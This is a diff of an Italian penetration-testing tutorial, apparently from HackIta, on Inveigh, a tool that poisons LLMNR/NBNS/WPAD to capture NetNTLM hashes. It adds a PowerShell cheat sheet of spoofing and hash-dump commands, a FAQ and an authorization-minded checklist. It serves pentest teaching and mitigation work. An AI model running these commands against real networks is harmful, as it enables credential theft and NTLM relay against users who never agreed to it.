-* Chiudi e pulisci: `Stop-Inveigh` e rimuovi artefatti/log se richiesto dalla procedura di lab.
-
 ## Riassunto 80/20
 
-| Obiettivo               | Azione pratica                    | Comando/Strumento                               |
-| ----------------------- | --------------------------------- | ----------------------------------------------- |
-| Capire se vale la pena  | Osserva richieste name resolution | `Invoke-Inveigh -Inspect`                       |
-| Avviare capture rapido  | Console + file output             | `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y` |
-| Ridurre rumore          | Disabilita repeat e NBNS          | `-SpooferRepeat N` + `-NBNS N`                  |
-| Estrarre hash catturati | Leggi NetNTLM in memoria          | `Get-InveighNTLM`                               |
-| Gestire shell “fragile” | Forza standard output             | `-OutputStreamOnly Y`                           |
-| Chiudere pulito         | Stop e cleanup                    | `Stop-Inveigh`                                  |
+| Obiettivo                   | Azione pratica                       | Comando/Strumento                               |
+| --------------------------- | ------------------------------------ | ----------------------------------------------- |
+| Capire se vale la pena      | Osserva richieste di name resolution | `Invoke-Inveigh -Inspect`                       |
+| Avviare la cattura          | Console + file output                | `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y` |
+| Ridurre il rumore           | Disabilita repeat e NBNS             | `-SpooferRepeat N` + `-NBNS N`                  |
+| Estrarre gli hash catturati | Leggi i NetNTLM in memoria           | `Get-InveighNTLM`                               |
+| Gestire una shell fragile   | Forza lo standard output             | `-OutputStreamOnly Y`                           |
+| Chiudere in modo pulito     | Stop e cleanup                       | `Stop-Inveigh`                                  |
 
 ## Concetti controintuitivi
 
-* **“Se non catturo nulla, è colpa del tool”**
-  Spesso è il lab: senza richieste LLMNR/NBNS/WPAD non hai trigger. Prima `-Inspect`, poi decidi.
-* **“Più spoofing = più risultati”**
-  Più spoofing = più rumore e più rischio. In lab, parti minimal (`NBNS` off, `SpooferRepeat` off) e scala.
-* **“WPAD è sempre la scorciatoia”**
-  In alcuni ambienti è spento o ben gestito. Se non lo vedi in `-Inspect`, non fissarti: lavora su LLMNR/NBNS.
-* **“Relay è la parte importante”**
-  In molti lab moderni il relay fallisce (signing/policy): è un successo difensivo. Il valore è dimostrare impatto o mitigazione.
-* **“HTTPS fa sembrare tutto più ‘legit’”**
-  Può introdurre certificati/artefatti e complicare cleanup. In lab usalo solo se stai testando proprio quel vettore.
+**"Se non catturo nulla, è colpa del tool."** Quasi sempre è il lab: senza richieste LLMNR/NBNS/WPAD reali non hai nessun trigger. Prima `-Inspect`, poi decidi.
+
+**"Più spoofing produce più risultati."** Più spoofing significa soprattutto più rumore e più rischio di essere notato. In lab conviene partire minimal (`NBNS` off, `SpooferRepeat` off) e scalare solo se serve.
+
+**"WPAD è sempre la scorciatoia più facile."** In molti ambienti moderni è disabilitato o gestito rigorosamente. Se `-Inspect` non mostra richieste WPAD, non insistere: lavora su LLMNR/NBNS.
+
+**"Il relay è la parte che conta davvero."** In parecchi lab aggiornati il relay fallisce per SMB signing o policy — ed è comunque un risultato utile: dimostra che una mitigazione funziona, non solo che un attacco riesce.
+
+**"Abilitare HTTPS rende tutto più credibile."** Introduce anche un certificato installato localmente e complica il cleanup. Usalo solo quando stai testando specificamente quel vettore.
+
+## Inveigh Cheat Sheet
+
+```powershell
+Import-Module .\Inveigh.psd1
+Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp -SpooferRepeat N -NBNS N
+Get-InveighNTLM
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -WPADAuth NTLM
+Stop-Inveigh
+```
+
+## Checklist operativa
+
+* Conferma che il test sia autorizzato e il perimetro chiaro
+* Osserva sempre prima con `-Inspect`, poi decidi se attivare spoofing/capture
+* Usa `-SpooferRepeat N` per ridurre il rumore generato
+* Tieni `-NBNS N` finché non hai un motivo specifico per abilitarlo
+* Verifica che `-OutputDir` sia scrivibile prima di lanciare una sessione lunga
+* Se catturi zero eventi, verifica traffico reale prima di sospettare un bug
+* Se testi il relay, fallo solo su target di lab e documenta anche i fallimenti
+* Chiudi sempre con `Stop-Inveigh` e rimuovi eventuali certificati/log residui
 
 ## FAQ
 
-D: Inveigh funziona anche senza privilegi elevati?
+**Cos'è Inveigh?**
+Uno strumento machine-in-the-middle per pentester su Windows, che sfrutta LLMNR/NBNS/WPAD per indurre e catturare autenticazioni NTLM.
 
-R: Dipende dalla versione e dalle feature usate. In lab, se non hai elevazione, preferisci modalità meno “raw” (listener dove possibile) e valida con `-Inspect`.
+**Qual è la differenza tra la versione PowerShell e quella .NET?**
+La versione PowerShell (1.506) è legacy e non più aggiornata; la versione C#/.NET (InveighZero) è oggi il ramo principale del progetto e copre più protocolli.
 
-D: Perché vedo soprattutto account macchina (con `$`)?
+**Inveigh cattura hash NTLM o NetNTLM?**
+Cattura NetNTLM challenge/response, non un hash NTLM nel senso stretto — craccabile offline con logica simile, ma tecnicamente un oggetto diverso.
 
-R: È normale: molti servizi parlano in automatico. Se ti serve focalizzarti su utenti, filtra output e riduci i vettori che generano rumore (es. NBNS, repeat).
+**Perché Inveigh non cattura nulla nel mio lab?**
+Quasi sempre perché non c'è traffico LLMNR/NBNS/WPAD reale nella subnet. Verifica prima con `-Inspect`.
 
-D: Posso usarlo “solo per sniffare” senza spoofare?
+**Inveigh richiede privilegi elevati?**
+Alcune funzionalità sì, in particolare il packet sniffing raw. Senza elevazione, i listener disponibili o la modalità inspect restano utilizzabili.
 
-R: Sì: usa `Invoke-Inveigh -Inspect` per osservare richieste LLMNR/NBNS senza attivare spoofing/capture aggressivo.
+**Il relay NTLM funziona sempre?**
+No: richiede che il target non imponga SMB signing e che l'account catturato abbia privilegi sufficienti. Un fallimento spesso significa che le mitigazioni funzionano.
 
-D: Come capisco se il relay è possibile nel lab?
-
-R: Se il target richiede SMB signing e/o l’account catturato non ha privilegi, il relay fallirà. Documenta il fallimento come mitigazione efficace.
-
-D: Cosa devo mettere nel report per essere “utile” al blue team?
-
-R: Evidenze (timestamp, sorgente, nome richiesto, tipo traffico), rischio (cattura NTLM/relay), e mitigazioni concrete (disabilitare LLMNR/NBNS/WPAD, SMB signing, auditing/alert).
+**Meglio Inveigh o Responder?**
+Dipende dalla posizione: Inveigh è comodo se sei già su un foothold Windows, Responder è il workflow più diretto da una postazione Linux in LAN.
 
 ## Link utili su HackIta
 
-* [Responder per LLMNR/NBT-NS/WPAD in LAN](https://hackita.it/articoli/responder/)
-* [Wireshark per analisi del traffico in lab](https://hackita.it/articoli/wireshark/)
-* [TShark per sniffing e filtri da terminale](https://hackita.it/articoli/tshark/)
-* [CrackMapExec per operazioni rapide su Active Directory](https://hackita.it/articoli/crackmapexec/)
-* [smbclient per accesso e attacco alle condivisioni](https://hackita.it/articoli/smbclient/)
-* [NBTScan per enumerazione NetBIOS utile al targeting](https://hackita.it/articoli/nbtscan/)
-* [Supporto](https://hackita.it/supporto/)
-* [Contatto](https://hackita.it/contatto/)
-* [Articoli](https://hackita.it/articoli/)
-* [Servizi](https://hackita.it/servizi/)
-* [About](https://hackita.it/about/)
-* [Categorie](https://hackita.it/categorie/)
+Per il confronto diretto con lo strumento equivalente da Linux vedi [Responder](https://hackita.it/articoli/responder/); per validare il traffico di rete anche visivamente, [Wireshark](https://hackita.it/articoli/wireshark/) o [TShark](https://hackita.it/articoli/tshark/) da terminale; per l'enumerazione SMB/AD prima di un relay, [smbclient](https://hackita.it/articoli/smbclient/), [Enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) e [CrackMapExec](https://hackita.it/articoli/crackmapexec/); per capire dove porta un account catturato, [BloodHound](https://hackita.it/articoli/bloodhound/).
 
-## Riferimenti autorevoli
+## Riferimenti ufficiali
 
-* [Inveigh (repo ufficiale)](https://github.com/Kevin-Robertson/Inveigh)
-* [MITRE ATT\&CK T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
-
-## CTA finale HackITA
-
-Se questo contenuto ti è utile e vuoi far crescere HackIta, puoi supportare il progetto qui: [https://hackita.it/supporto/](https://hackita.it/supporto/)
-
-Se vuoi accelerare davvero (lab guidati, metodo, correzione tecnica), trovi la formazione 1:1 qui: [https://hackita.it/servizi/](https://hackita.it/servizi/)
-
-Per aziende: assessment, test interni e percorsi di hardening/detection su AD e reti Windows sono disponibili qui: [https://hackita.it/servizi/](https://hackita.it/servizi/)
+* [Inveigh – Repository ufficiale](https://github.com/Kevin-Robertson/Inveigh)
+* [MITRE ATT\&CK – T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
+* [Infinite Logins – Capturing & Relaying Net-NTLM Hashes Using Inveigh](https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/): walkthrough indipendente con parametri e note pratiche
